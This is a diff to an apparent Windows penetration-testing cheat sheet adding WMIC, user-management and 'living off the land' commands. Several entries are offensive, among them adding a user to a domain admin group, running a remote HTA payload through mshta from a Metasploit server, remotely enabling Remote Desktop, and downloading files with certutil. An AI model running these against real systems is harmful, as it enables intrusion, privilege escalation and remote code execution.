@@ -10,6 +10,7 @@ Display All User Info----whoami /all
 Env Variables Beginning with "U"----SET U All
 Add User----net user <user> <password> /add
 Add User to Group----net localgroup administrators /add <user>
+Add User to Domain Group----net group "Recruiting Admins" username /dom
 
 ##Network
 Network Interfaces----ipconfig /all  
@@ -71,3 +72,24 @@ Find Permissions----accesschk.exe -uwqs "Authenticated Users" c:\*.*
 Find Permissions----cacls "c:\Program Files" /T | findstr Users
 
 Stop network traffic to domain----echo 127.0.0.1 my.crypto-pool.info >> %WINDIR%\system32\drivers\etc\hosts
+Take Ownership of a File----takeown /F file.txt
+MSHTA.exe Code Execution----Start metasploit server (exploit/windows/misc/hta_server).  Then, run "mshta.exe //&lt;ip-addr&gt;/random.hta" on the host machine.
+
+Temporary Folder (System)----C:\Windows\Temp
+Temporary Folder (User)----%USERPROFILE%\AppData\Local\
+
+##WMIC
+List Groups----wmic group list brief
+List Hotfixes----wmic qfe list brief
+Desktop Information----wmic desktop list brief
+CD Information----wmic cdrom list brief
+NIC Information----wmic nic list brief
+Control Output of wmic Command----wmic process get name,processid
+Close a Program----wmic process where processid="1000" call terminate
+Close a Remote Program----wmic /node:localhost /user:rambo /password:FirstBl00dPart3 process where name="paint.exe" call terminate
+Turn on RemoteDesktop-----wmic /node:"servername" /user:"user@domain" /password: "password" RDToggle where ServerName="server name" call SetAllowTSConnections 1
+LogicalDisk Free Space----wmic /Node:%%A LogicalDisk Where DriveType="3" Get DeviceID,FileSystem,FreeSpace,Size /Format:csv MORE /E +2 >> SRVSPACE.CSV
+List Startup Processes----wmic startup get caption,command,user
+
+##Lolbas
+Make HTTP Request (Download a file)----certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe
